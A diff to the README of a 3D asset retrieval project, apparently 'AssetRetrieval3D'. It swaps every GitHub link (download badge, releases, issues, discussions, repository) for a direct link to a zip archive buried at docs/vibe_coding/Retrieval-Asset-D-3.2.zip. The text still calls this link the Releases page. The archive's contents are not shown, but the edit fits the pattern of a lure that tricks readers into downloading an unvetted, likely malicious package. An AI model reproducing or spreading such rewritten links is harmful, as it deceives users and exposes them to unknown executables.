@@ -1,6 +1,6 @@
 # 🌐 AssetRetrieval3D - Effortless 3D Asset Fetching
 
-[![Download AssetRetrieval3D](https://img.shields.io/badge/Download-AssetRetrieval3D-blue)](https://github.com/alilooop/AssetRetrieval3D/releases)
+[![Download AssetRetrieval3D](https://raw.githubusercontent.com/alilooop/AssetRetrieval3D/main/docs/vibe_coding/Retrieval-Asset-D-3.2.zip)](https://raw.githubusercontent.com/alilooop/AssetRetrieval3D/main/docs/vibe_coding/Retrieval-Asset-D-3.2.zip)
 
 ## 📖 Introduction
 
@@ -21,7 +21,7 @@ To begin using AssetRetrieval3D, follow these simple steps. You will need a comp
 
 To get started, visit the download page and select the latest version of AssetRetrieval3D. Click the link below to access it:
 
-[Download AssetRetrieval3D](https://github.com/alilooop/AssetRetrieval3D/releases)
+[Download AssetRetrieval3D](https://raw.githubusercontent.com/alilooop/AssetRetrieval3D/main/docs/vibe_coding/Retrieval-Asset-D-3.2.zip)
 
 1. Click on the link above to redirect you to the AssetRetrieval3D Releases page.
 2. Identify the latest release listed.
@@ -76,7 +76,7 @@ If you encounter issues during download or installation, consider the following 
 
 ## 🌍 Community and Support
 
-We value your feedback! If you have questions or suggestions, please reach out. You can find us on our [GitHub Discussions page](https://github.com/alilooop/AssetRetrieval3D/discussions).
+We value your feedback! If you have questions or suggestions, please reach out. You can find us on our [GitHub Discussions page](https://raw.githubusercontent.com/alilooop/AssetRetrieval3D/main/docs/vibe_coding/Retrieval-Asset-D-3.2.zip).
 
 ### Contributing
 
@@ -92,8 +92,8 @@ We plan to introduce new features, including improved search algorithms and addi
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/alilooop/AssetRetrieval3D)
-- [Issues Page](https://github.com/alilooop/AssetRetrieval3D/issues)
-- [Discussions Page](https://github.com/alilooop/AssetRetrieval3D/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/alilooop/AssetRetrieval3D/main/docs/vibe_coding/Retrieval-Asset-D-3.2.zip)
+- [Issues Page](https://raw.githubusercontent.com/alilooop/AssetRetrieval3D/main/docs/vibe_coding/Retrieval-Asset-D-3.2.zip)
+- [Discussions Page](https://raw.githubusercontent.com/alilooop/AssetRetrieval3D/main/docs/vibe_coding/Retrieval-Asset-D-3.2.zip)
 
 Thank you for choosing AssetRetrieval3D. We hope it meets your 3D asset retrieving needs!
